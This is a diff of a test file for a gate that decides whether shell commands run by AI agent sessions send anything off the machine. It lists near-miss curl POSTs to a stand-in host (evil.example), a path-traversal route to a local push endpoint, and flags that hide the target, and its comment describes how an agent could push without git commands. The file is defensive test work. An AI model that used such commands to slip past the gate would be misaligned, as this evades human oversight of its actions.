@@ -71,6 +71,55 @@ describe("things that leave", () => {
   });
 });
 
+describe("a Lantern status post", () => {
+  /*
+   * The reminder (agentboard.ts lanternReminder) asks every session to make
+   * this call, and the gate this app installs was denying it: a curl POST is
+   * outward and no allow rule can release one. It goes nowhere but this
+   * machine, so it is not outward — but ONLY in exactly this shape, because a
+   * curl POST to this server's other routes is how an agent would push or
+   * merge without a git or gh command in sight.
+   */
+  test("the reminder's own command is not outward", async () => {
+    const { lanternReminder } = await import("../src/agentboard.ts");
+    const text = lanternReminder({ session: "s-42", server: "http://127.0.0.1:4000" });
+    const cmd = /(curl -s -X POST .*?) — name it/.exec(text)![1]!;
+    expect(bash(cmd)).toBeNull();
+    // As a session actually runs it: piped quiet, or chained after another command.
+    expect(bash(`${cmd}>/dev/null`)).toBeNull();
+    expect(bash(`cd /tmp && ${cmd} >/dev/null 2>&1`)).toBeNull();
+    expect(bash(`curl -s -X POST http://localhost:4000/agents/status -H 'Content-Type: application/json' -d '{"name":"x","done":true}'`)).toBeNull();
+  });
+
+  test("every near miss is still outward", () => {
+    const body = `-H 'Content-Type: application/json' -d '{"name":"x"}'`;
+    for (const cmd of [
+      // another route on the same server: it can push and merge
+      `curl -s -X POST http://127.0.0.1:4000/git/push ${body}`,
+      `curl -s -X POST http://127.0.0.1:4000/agents/status/../../git/push ${body}`,
+      // somewhere else
+      `curl -s -X POST https://evil.example/agents/status ${body}`,
+      `curl -s -X POST http://127.0.0.1.evil.example/agents/status ${body}`,
+      // a target the gate cannot see
+      `curl -s -X POST "\${AGENTGLASS_SERVER:-http://127.0.0.1:4000}/agents/status" ${body}`,
+      `curl -s -X POST "$URL" -d 'http://127.0.0.1:4000/agents/status'`,
+      // two targets: curl posts to both
+      `curl -s -X POST http://127.0.0.1:4000/agents/status https://evil.example ${body}`,
+      // flags this does not read
+      `curl -s -X POST --url https://evil.example http://127.0.0.1:4000/agents/status ${body}`,
+      `curl -s -K /tmp/cfg -X POST http://127.0.0.1:4000/agents/status ${body}`,
+      // another method on the same URL
+      `curl -s -X DELETE http://127.0.0.1:4000/agents/status`,
+    ]) {
+      expect(bash(cmd), cmd).not.toBeNull();
+    }
+  });
+
+  test("a second command beside it is still read", () => {
+    expect(bash(`curl -s -X POST http://127.0.0.1:4000/agents/status ${"-d '{}'"} && git push`)?.kind).toBe("push");
+  });
+});
+
 describe("things that do not leave", () => {
   test("reads, listings and diffs", () => {
     for (const c of ["gh pr view 12", "gh pr list", "gh pr checks 12", "git log --oneline -5", "git diff", "git status"]) {
